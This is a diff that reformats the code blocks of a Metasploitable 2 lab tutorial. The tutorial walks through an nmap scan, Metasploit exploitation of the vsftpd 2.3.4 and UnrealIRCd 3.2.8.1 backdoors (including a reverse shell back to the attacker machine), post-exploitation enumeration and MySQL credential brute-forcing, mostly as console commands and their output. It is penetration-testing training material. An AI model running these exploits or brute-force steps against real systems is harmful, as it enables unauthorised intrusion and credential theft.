@@ -69,11 +69,9 @@ Metasploit is a powerful framework that provides a modular approach to exploitat
 * **Post‑exploitation modules** – for privilege escalation, persistence, etc.
 
 You interact with Metasploit via the `msfconsole` command. To start it:
-<div class="code-block-wrap">
-  <span class="code-block-label">Launch msfconsole</span>
-  <button class="copy-btn" aria-label="Copy code"><i class="fa-regular fa-copy" aria-hidden="true"></i> Copy</button>
-  <pre><code>sudo msfconsole</code></pre>
-</div>
+```bash
+sudo msfconsole
+```
 Inside the console, you can search for modules, set options, and run exploits. Basic commands you’ll use:
 * `search <keyword>` – find modules.
 * `use <module_path>` – select a module.
@@ -84,21 +82,17 @@ Inside the console, you can search for modules, set options, and run exploits. B
 ## Reconnaissance – Gathering Intel
 
 Before exploiting, you need to know what services are running on the target. Nmap is perfect for this. Fire up a terminal on Kali and run:
-<div class="code-block-wrap">
-  <span class="code-block-label">Nmap scan of Metasploitable 2</span>
-  <button class="copy-btn" aria-label="Copy code"><i class="fa-regular fa-copy" aria-hidden="true"></i> Copy</button>
-  <pre><code>sudo nmap -sV -p- 192.168.56.102</code></pre>
-</div>
+```bash
+sudo nmap -sV -p- 192.168.56.102
+```
 You’ll see a list of open ports and service versions. Pay attention to port **21** (vsftpd) and port **6667** (UnrealIRCd). Both are vulnerable. Also note port 80 (Apache), 3306 (MySQL), and 8180 (Tomcat).
 
 ## Exploit 1: vsftpd 2.3.4 Backdoor (CVE‑2011‑2523)
 
 The vsftpd 2.3.4 version has a backdoor that allows an attacker to execute arbitrary commands. The backdoor is triggered by a specific username (ending with `:)`) that opens a shell on port 6200. Metasploit has a module that automates this.
 
-<div class="code-block-wrap">
-  <span class="code-block-label">Exploiting vsftpd backdoor</span>
-  <button class="copy-btn" aria-label="Copy code"><i class="fa-regular fa-copy" aria-hidden="true"></i> Copy</button>
-  <pre><code>msf6 > search vsftpd
+```bash
+msf6 > search vsftpd
 
 msf6 > use exploit/unix/ftp/vsftpd_234_backdoor
 msf6 exploit(unix/ftp/vsftpd_234_backdoor) > set RHOSTS 192.168.56.102
@@ -109,8 +103,7 @@ msf6 exploit(unix/ftp/vsftpd_234_backdoor) > run
 [*] 192.168.56.102:21 - Backdooring...
 [*] 192.168.56.102:21 - Backdoor triggered
 [*] 192.168.56.102:21 - Command shell session 1 opened
-</code></pre>
-</div>
+```
 After `run`, you’ll get a command shell on the target. You can run commands like `whoami`, `id`, `ls`, etc. The shell is not interactive enough, but it’s a proof of concept. For a fully interactive shell, you can use a reverse shell payload.
 
 <div class="callout callout-success">
@@ -125,10 +118,8 @@ After `run`, you’ll get a command shell on the target. You can run commands li
 
 UnrealIRCd 3.2.8.1 contains a backdoor that can be exploited by sending a specific line to the server, causing it to execute arbitrary commands. The Metasploit module for this is `exploit/unix/irc/unreal_ircd_3281_backdoor`.
 
-<div class="code-block-wrap">
-  <span class="code-block-label">Exploiting UnrealIRCd backdoor</span>
-  <button class="copy-btn" aria-label="Copy code"><i class="fa-regular fa-copy" aria-hidden="true"></i> Copy</button>
-  <pre><code>msf6 > use exploit/unix/irc/unreal_ircd_3281_backdoor
+```bash
+msf6 > use exploit/unix/irc/unreal_ircd_3281_backdoor
 msf6 exploit(unix/irc/unreal_ircd_3281_backdoor) > set RHOSTS 192.168.56.102
 msf6 exploit(unix/irc/unreal_ircd_3281_backdoor) > set PAYLOAD cmd/unix/reverse
 msf6 exploit(unix/irc/unreal_ircd_3281_backdoor) > set LHOST 192.168.56.101   # your Kali IP
@@ -137,8 +128,7 @@ msf6 exploit(unix/irc/unreal_ircd_3281_backdoor) > run
 [*] 192.168.56.102:6667 - UnrealIRCd 3.2.8.1 backdoor
 [*] 192.168.56.102:6667 - Sending backdoor command...
 [*] Command shell session 2 opened
-</code></pre>
-</div>
+```
 This time we used a reverse shell payload (`cmd/unix/reverse`) which establishes a connection back to your Kali machine. After the exploit, you’ll have a shell on the target. Again, you’ll be `root`.
 
 <div class="callout callout-info">
@@ -154,34 +144,28 @@ This time we used a reverse shell payload (`cmd/unix/reverse`) which establishes
 Since we already have root access, we don’t need privilege escalation. However, in a real engagement, you might not always get root directly. Metasploit has many post‑exploitation modules to gather information, maintain access, and more.
 For example, you can use the `post/linux/gather/checkvm` module to check if the target is a VM, or `post/linux/gather/enum_system` to gather system information.
 
-<div class="code-block-wrap">
-  <span class="code-block-label">Post‑exploitation example</span>
-  <button class="copy-btn" aria-label="Copy code"><i class="fa-regular fa-copy" aria-hidden="true"></i> Copy</button>
-  <pre><code>msf6 > use post/linux/gather/enum_system
+```bash
+msf6 > use post/linux/gather/enum_system
 msf6 post(linux/gather/enum_system) > set SESSION 1
 msf6 post(linux/gather/enum_system) > run
 
 [*] Running module against 192.168.56.102
 [*] Session 1 is not a Meterpreter session... still gathering
 [+] Info stored in /root/.msf4/loot/...
-</code></pre>
-</div>
+```
 You can also upgrade your shell to a **Meterpreter** session, which provides more advanced features like file upload/download, keylogging, and pivoting. Use the `sessions -u <id>` command to upgrade.
 
 ## Auxiliary Modules for Further Enumeration
 
 Metasploit also includes many auxiliary modules for scanning and enumeration. For instance, you can use the `auxiliary/scanner/mysql/mysql_login` module to brute‑force MySQL credentials (the default root password is blank or `root`).
 
-<div class="code-block-wrap">
-  <span class="code-block-label">MySQL login scanner</span>
-  <button class="copy-btn" aria-label="Copy code"><i class="fa-regular fa-copy" aria-hidden="true"></i> Copy</button>
-  <pre><code>msf6 > use auxiliary/scanner/mysql/mysql_login
+```bash
+msf6 > use auxiliary/scanner/mysql/mysql_login
 msf6 auxiliary(scanner/mysql/mysql_login) > set RHOSTS 192.168.56.102
 msf6 auxiliary(scanner/mysql/mysql_login) > run
 
 [*] 192.168.56.102:3306 - 192.168.56.102:3306 - MySQL - Login successful: 'root':''
-</code></pre>
-</div>
+```
 
 ## Next Steps & Practice
 
